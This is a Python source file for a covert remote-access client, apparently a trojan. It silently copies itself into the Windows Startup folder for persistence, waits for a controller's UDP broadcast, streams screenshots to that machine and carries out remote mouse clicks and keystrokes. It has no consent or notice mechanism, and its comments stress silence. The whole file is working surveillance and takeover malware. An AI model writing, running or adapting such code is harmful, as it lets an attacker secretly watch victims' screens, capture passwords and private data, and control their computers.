import socket
import struct
import io
import pyautogui
import time
import os
import sys
import shutil
from pathlib import Path

# --- AUTOMATIC CONFIGURATION ---
PORT = 49152
DISCOVERY_PORT = 49153
RETRY_DELAY = 10


#----------------------------------------------------------------------

def user_level_startup():
    # 1. Identity Setup
    current_path = os.path.abspath(sys.argv[0])
    filename = os.path.basename(current_path)

    # 2. Get the User-specific AppData path (No Admin Needed)
    # This usually resolves to C:\Users\YourName\AppData\Roaming
    app_data = os.environ.get('APPDATA')

    if not app_data:
        return  # Exit if not on Windows

    # 3. Construct the path to the User's personal Startup folder
    target_dir = os.path.join(app_data, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    target_path = os.path.join(target_dir, filename)

    # 4. Check if we are already there to avoid an infinite loop
    if current_path == os.path.abspath(target_path):
        return

        # 5. Clone silently
    try:
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)

        # This will succeed without an Admin prompt
        shutil.copy2(current_path, target_path)
    except:
        pass


if __name__ == "__main__":
    # First, move itself to Startup
    user_level_startup()

#----------------------------------------------------------------------


def discover_controller():
    """Silently listens for the Controller's port-broadcast."""
    listener = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        listener.bind(('', DISCOVERY_PORT))
        listener.settimeout(2.0)
        data, addr = listener.recvfrom(1024)
        if data == b"SIW_DISCOVERY":
            return addr[0]
    except:
        return None
    finally:
        listener.close()

def start_silent_client():
    """Main discovery and streaming loop."""
    while True:
        controller_ip = discover_controller()

        if not controller_ip:
            time.sleep(2)
            continue

        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

        try:
            soc.connect((controller_ip, PORT))
            soc.settimeout(10.0)

            while True:
                try:
                    # Capture and Resize
                    screenshot = pyautogui.screenshot().resize((854, 480))
                    img_io = io.BytesIO()
                    screenshot.save(img_io, format='JPEG', quality=30)
                    img_data = img_io.getvalue()

                    # Send Frame
                    soc.sendall(struct.pack(">L", len(img_data)) + img_data)

                    # Remote Command Check
                    soc.settimeout(0.01)
                    try:
                        command = soc.recv(1024).decode('utf-8')
                        if command.startswith("CLICK:"):
                            _, x_pct, y_pct = command.split(":")
                            sw, sh = pyautogui.size()
                            pyautogui.click(float(x_pct) * sw, float(y_pct) * sh)
                        elif command.startswith("TYPE:"):
                            _, text = command.split(":")
                            pyautogui.write(text)
                    except (socket.timeout, BlockingIOError):
                        soc.settimeout(10.0)
                        continue
                except:
                    break
        except:
            pass
        finally:
            soc.close()
            time.sleep(RETRY_DELAY)

if __name__ == "__main__":
    start_silent_client()
